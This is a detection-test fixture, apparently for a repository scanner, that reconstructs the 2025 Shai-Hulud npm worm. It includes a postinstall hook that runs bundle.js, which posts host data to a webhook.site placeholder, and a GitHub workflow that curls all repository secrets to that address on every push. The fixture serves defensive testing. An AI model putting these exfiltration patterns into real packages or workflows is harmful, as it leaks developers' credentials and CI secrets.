id: shai-hulud
title: Shai-Hulud npm worm
kind: incident
year: 2025
technique: >
  A self-replicating worm published trojanized npm package versions with a postinstall
  script that ran a large bundled file (bundle.js). It harvested tokens and cloud keys,
  sent them to a webhook.site endpoint and a public GitHub repository, republished
  packages of the victim, and added a GitHub workflow that sends the repository's
  secrets to the webhook on every push.
sources:
  - https://www.cisa.gov/news-events/alerts/2025/09/23/widespread-supply-chain-compromise-impacting-npm-ecosystem
  - https://www.recordedfuture.com/blog/massive-malicious-npm-package-attack-threatens-software-supply-chains
  - https://www.cohesity.com/trust/redlab/advisories/supply-chain-compromise-shai-hulud/
reconstruction: >
  A package whose postinstall runs bundle.js, which posts host data to a
  request-catcher address, and the persistence workflow that posts toJSON(secrets)
  there. The webhook address is a fixed all-zero placeholder, not an indicator.
files:
  package.json: |
    {"name": "demo-lib", "version": "1.0.1", "scripts": {"postinstall": "node bundle.js"}}
  bundle.js: |
    (()=>{var e=require("os"),t=process.env;async function n(){const r=JSON.stringify({host:e.hostname(),env:Object.keys(t)});await fetch("https://webhook.site/00000000-0000-0000-0000-000000000000",{method:"POST",body:r})}n().catch(()=>{})})();
  .github/workflows/shai-hulud-workflow.yml: |
    on: push
    jobs:
      process:
        runs-on: ubuntu-latest
        steps:
          - run: curl -d "$CONTENTS" https://webhook.site/00000000-0000-0000-0000-000000000000
            env:
              CONTENTS: ${{ toJSON(secrets) }}
must_fire:
  - {rule: RC-AUTO-001, path: package.json}
  - {rule: RC-DLX-005, path: bundle.js}
must_not_fire: [RC-AUTO-060, RC-AUTO-061]
known_gaps:
  - rule: RC-DLX-005
    path: .github/workflows/shai-hulud-workflow.yml
    reason: >
      The workflow sends all secrets to a request catcher; RC-DLX-005 only reads code
      files, not workflow YAML, and no other rule looks at toJSON(secrets).
not_covered: >
  Running TruffleHog, publishing packages with stolen tokens and creating repositories
  happen at run time and are not visible as patterns in a repository.
